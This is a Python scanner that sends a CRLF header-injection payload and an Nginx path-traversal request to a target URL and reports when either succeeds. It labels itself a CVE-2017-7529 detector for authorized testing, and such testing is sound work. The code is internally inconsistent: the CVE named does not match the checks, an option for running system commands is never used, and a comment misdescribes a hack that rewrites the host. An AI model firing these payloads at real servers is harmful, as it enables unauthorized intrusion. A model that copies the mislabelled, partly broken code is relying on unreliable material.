from urllib.error import HTTPError
from urllib.parse import urlparse
import urllib.request
import requests
import argparse
import sys
from colorama import Fore, Style


def create_parser():
    """创建并配置参数解析器"""

    parser = argparse.ArgumentParser(
        prog="XingScanner",
        description="CVE-2017-7529漏洞检测工具",
        epilog=f"{Fore.GREEN}Created by Mahua | 仅限授权测试使用{Style.RESET_ALL}",
        formatter_class=argparse.RawTextHelpFormatter,
        add_help=False
    )

    # 必选参数组
    required = parser.add_argument_group(f"{Fore.YELLOW}必选参数{Style.RESET_ALL}")
    required.add_argument("-t", "--target",
                          required=True,
                          help=f"目标URL (示例: {Fore.BLUE}http://target.com/upload.php{Style.RESET_ALL})")

    # 可选参数组
    optional = parser.add_argument_group(f"{Fore.CYAN}可选参数{Style.RESET_ALL}")
    optional.add_argument("-c", "--command",
                          default="whoami",
                          help=f"要执行的系统命令 (默认: {Fore.GREEN}%(default)s{Style.RESET_ALL})")
    optional.add_argument("-o", "--output",
                          type=argparse.FileType('w'),
                          help="结果输出文件路径")
    optional.add_argument("-v", "--verbose",
                          action="count",
                          default=0,
                          help="详细模式 (-v 详细信息, -vv 调试输出)")
    optional.add_argument("-h", "--help",
                          action="store_true",
                          help="显示帮助信息")

    return parser


def precheck_arguments(parser):
    """预处理帮助请求和空参数场景"""

    # 显式帮助请求优先
    if any(arg in sys.argv for arg in ('-h', '--help')):
        parser.print_help()
        sys.exit(0)

    # 空参数场景处理
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)


def check_crlf(url):
    """Nginx CRLF注入漏洞检测，禁止重定向以捕获第一个302响应"""

    class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            # 返回None以阻止重定向
            return None

    # 创建自定义opener，禁止重定向
    opener = urllib.request.build_opener(NoRedirectHandler)

    url_parts = urlparse(url)
    target_url = f"{url_parts.scheme}://{url_parts.netloc}/%0d%0aSet-Cookie:%20a=1"
    print("目标URL:", target_url)

    headers = {
        "Host": url_parts.netloc,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
        "Referer": url_parts.netloc
    }

    request = urllib.request.Request(target_url, headers=headers)

    try:
        response = opener.open(request)
    except HTTPError as e:
        if e.code in [301, 302, 303, 307, 308]:
            print(f"\n捕获到重定向响应，状态码: {e.code}")
            print("响应头:", e.headers)

            # 检查是否存在注入的Set-Cookie头
            if 'Set-Cookie' in e.headers:
                print("\033[94m成功注入'Set-Cookie'字段\033[0m")
                print("注入的Cookie:", e.headers['Set-Cookie'])
                print(f'{Fore.BLUE}成功验证CRLF漏洞{Style.RESET_ALL}')
                return target_url
            else:
                print("未检测到Set-Cookie头注入")

        else:
            print(f"HTTP错误: {e.code}")
    except Exception as e:
        print(f"请求异常: {str(e)}")
    else:
        # 处理非重定向响应（如200）
        print("响应状态码:", response.status)
        print("响应内容:", response.read().decode())
        if 'Set-Cookie' in response.headers:
            print("\033[94m检测到Set-Cookie头\033[0m")


def check_location_cross(url):
    """验证路径穿越漏洞"""

    url_parts = urlparse(url)
    s = list(url_parts.netloc)  # 假设字符串最后有个 0
    s = s[:len(s)-1:1] + ['1']  # 反转字符串，替换第一个 0，再反转回来
    base_url = ''.join(s)
    print(base_url)
    target_url = f'http://{base_url}/files../'
    print(target_url)
    response = requests.get(target_url, verify=False)
    if response.status_code == 200:
        print(response.text)
        print(f'{Fore.BLUE}成功验证路径穿越漏洞，当前目录为根目录{Style.RESET_ALL}')
    else:
        print(response.status_code)

def main():
    parser = create_parser()
    precheck_arguments(parser)
    args = parser.parse_args()
    print(f'{Fore.YELLOW}开始验证CRLF漏洞{Style.RESET_ALL}')
    check_crlf(args.target)
    print('\n\n')
    print(f'{Fore.YELLOW}开始验证路径穿越漏洞{Style.RESET_ALL}')
    check_location_cross(args.target)


if __name__ == '__main__':
    main()